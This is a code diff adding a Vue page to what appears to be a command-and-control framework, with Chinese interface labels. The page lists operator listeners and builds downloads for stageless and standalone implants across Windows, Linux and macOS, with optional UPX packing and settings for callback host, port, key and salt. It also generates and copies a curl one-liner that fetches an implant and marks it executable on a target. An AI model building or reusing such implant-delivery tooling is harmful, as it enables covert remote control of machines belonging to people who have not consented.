@@ -1,7 +1,94 @@
 <script setup lang="ts">
-// TODO: 对齐 4.9.3 页面（下一步移植）
+// 载荷下载：按监听器生成 stageless，或独立 listen 载荷；支持复制拉取命令
+import { onMounted, reactive, ref } from 'vue'
+import { message } from 'ant-design-vue'
+import { downloadURL, post } from '../api/http'
+
+const listeners = ref<any[]>([])
+const form = reactive({
+  id: 0, arch: 'linux_amd64', tp: 'tcp', host: '127.0.0.1', port: 4444,
+  vkey: '', salt: '', upx: false,
+})
+const arches = ['linux_amd64', 'linux_386', 'linux_arm64', 'linux_arm',
+  'windows_amd64', 'windows_386', 'darwin_amd64', 'darwin_arm64']
+
+async function load() {
+  const res: any = await post('/listener/list', { page: 1, pageSize: 100 })
+  listeners.value = res?.result?.items || []
+  if (!form.id && listeners.value.length) form.id = listeners.value[0].Id
+}
+onMounted(load)
+
+function url(kind: 'stageless' | 'listen') {
+  if (kind === 'stageless') {
+    if (!form.id) { message.warning('先选择监听器'); return '' }
+    return downloadURL('/download/stageless', { id: form.id, arch: form.arch, upx: String(form.upx) })
+  }
+  return downloadURL('/download/listen', {
+    arch: form.arch, tp: form.tp, host: form.host, port: form.port,
+    vkey: form.vkey, salt: form.salt, upx: String(form.upx),
+  })
+}
+
+function download(kind: 'stageless' | 'listen') {
+  const u = url(kind)
+  if (u) location.href = u
+}
+
+function cmd(kind: 'stageless' | 'listen') {
+  const u = url(kind)
+  if (!u) return ''
+  const ext = form.arch.startsWith('windows') ? 'exe' : 'bin'
+  return `curl -sSL '${u}' -o agent.${ext} && chmod +x agent.${ext}`
+}
+
+async function copy(kind: 'stageless' | 'listen') {
+  const c = cmd(kind)
+  if (!c) return
+  try { await navigator.clipboard.writeText(c); message.success('命令已复制') }
+  catch { message.info(c) }
+}
 </script>
 
 <template>
-  <a-card><a-empty description="DownloadView 待移植（当前使用旧前端）" /></a-card>
+  <a-card :bordered="false" title="载荷下载">
+    <a-form layout="inline" :label-col="{ span: 6 }">
+      <a-form-item label="监听器">
+        <a-select v-model:value="form.id" style="width: 220px">
+          <a-select-option v-for="l in listeners" :key="l.Id" :value="l.Id">
+            #{{ l.Id }} {{ l.Mode }} {{ l.ListenAddr }}
+          </a-select-option>
+        </a-select>
+      </a-form-item>
+      <a-form-item label="架构">
+        <a-select v-model:value="form.arch" style="width: 180px">
+          <a-select-option v-for="a in arches" :key="a" :value="a">{{ a }}</a-select-option>
+        </a-select>
+      </a-form-item>
+      <a-form-item label="UPX"><a-switch v-model:checked="form.upx" /></a-form-item>
+    </a-form>
+
+    <a-divider />
+    <a-space wrap>
+      <a-button type="primary" @click="download('stageless')">下载 Stageless</a-button>
+      <a-button @click="copy('stageless')">复制 stageless 拉取命令</a-button>
+    </a-space>
+
+    <a-divider>独立 listen 载荷</a-divider>
+    <a-form layout="inline">
+      <a-form-item label="传输">
+        <a-select v-model:value="form.tp" style="width: 120px">
+          <a-select-option v-for="t in ['tcp', 'kcp', 'ws', 'http']" :key="t" :value="t">{{ t }}</a-select-option>
+        </a-select>
+      </a-form-item>
+      <a-form-item label="回连地址"><a-input v-model:value="form.host" style="width: 160px" /></a-form-item>
+      <a-form-item label="端口"><a-input-number v-model:value="form.port" :min="1" :max="65535" /></a-form-item>
+      <a-form-item label="Vkey"><a-input v-model:value="form.vkey" style="width: 160px" /></a-form-item>
+      <a-form-item label="加密盐"><a-input v-model:value="form.salt" style="width: 160px" /></a-form-item>
+    </a-form>
+    <a-space wrap style="margin-top: 12px">
+      <a-button @click="download('listen')">下载 Listen 载荷</a-button>
+      <a-button @click="copy('listen')">复制 listen 拉取命令</a-button>
+    </a-space>
+  </a-card>
 </template>
